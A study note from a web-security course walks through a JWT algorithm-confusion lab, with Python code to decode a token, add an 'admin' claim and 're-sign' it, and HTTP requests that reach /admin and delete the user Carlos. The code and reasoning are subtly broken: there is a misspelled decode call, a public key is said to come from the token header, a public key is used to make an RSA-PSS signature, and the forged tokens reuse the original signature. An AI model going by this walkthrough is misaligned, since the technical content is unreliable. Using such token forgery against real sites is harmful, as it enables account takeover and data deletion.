---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Step-by-Step Walkthrough

### Step 1: Obtain the Server's Public Key

First, you need to obtain the server's public key. This key is typically available in the server's configuration or can be extracted from the JWT itself.

#### Extracting the Public Key

Assuming the public key is embedded in the JWT, you can extract it by decoding the token. Here’s an example of how to decode a JWT using Python:

```python
import base64
import json

def decode_jwt(token):
    header, payload, signature = token.split('.')
    decoded_header = base64.urlsafe_b64decode(header + '==').decode('utf-8')
    decoded_payload = base64.urlsafe_b664decode(payload + '==').decode('utf-8')
    return json.loads(decoded_header), json.loads(decoded_payload)

token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
header, payload = decode_jwt(token)
print(header)
print(payload)
```

This script decodes the JWT and prints the header and payload. From the header, you can extract the public key.

### Step 2: Modify the Session Token

Once you have the public key, you can modify the session token to grant yourself admin privileges. This involves changing the payload to include the necessary claims.

#### Modifying the Payload

Here’s an example of modifying the payload to include admin privileges:

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "admin": true
}
```

### Step 3: Sign the Modified Token

Next, you need to sign the modified token using the public key. This ensures that the server accepts the token as valid.

#### Signing the Token

Here’s an example of signing the token using Python:

```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Load the public key
with open("public_key.pem", "rb") as key_file:
    public_key = serialization.load_pem_public_key(
        key_file.read(),
        backend=default_backend()
    )

# Encode the header and payload
header = {"alg": "RS256", "typ": "JWT"}
payload = {"sub": "1234567890", "name": "John Doe", "iat": 1516239022, "admin": true}
encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')

# Create the signature
to_sign = encoded_header + b"." + encoded_payload
signature = public_key.sign(
    to_sign,
    padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ),
    hashes.SHA256()
)
encoded_signature = base64.urlsafe_b64encode(signature).rstrip(b'=')

# Construct the final token
final_token = f"{encoded_header.decode()}.{encoded_payload.decode()}.{encoded_signature.decode()}"
print(final_token)
```

### Step 4: Access the Admin Panel

With the modified and signed token, you can now access the admin panel at `/admin` and perform actions such as deleting the user `Carlos`.

#### Accessing the Admin Panel

Here’s an example of making an HTTP request to access the admin panel:

```http
GET /admin HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Step 5: Deleting the User Carlos

Once you have access to the admin panel, you can delete the user `Carlos` by making an appropriate HTTP request.

#### Deleting the User

Here’s an example of making an HTTP request to delete the user `Carlos`:

```http
DELETE /users/Carlos HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

---
<!-- nav -->
[[12-Real-World Examples|Real-World Examples]] | [[Web Security (PortSwigger)/19-JWT Attacks/08-Lab 8 JWT authentication bypass via algorithm confusion with no exposed key/00-Overview|Overview]] | [[14-Understanding Algorithm Confusion|Understanding Algorithm Confusion]]
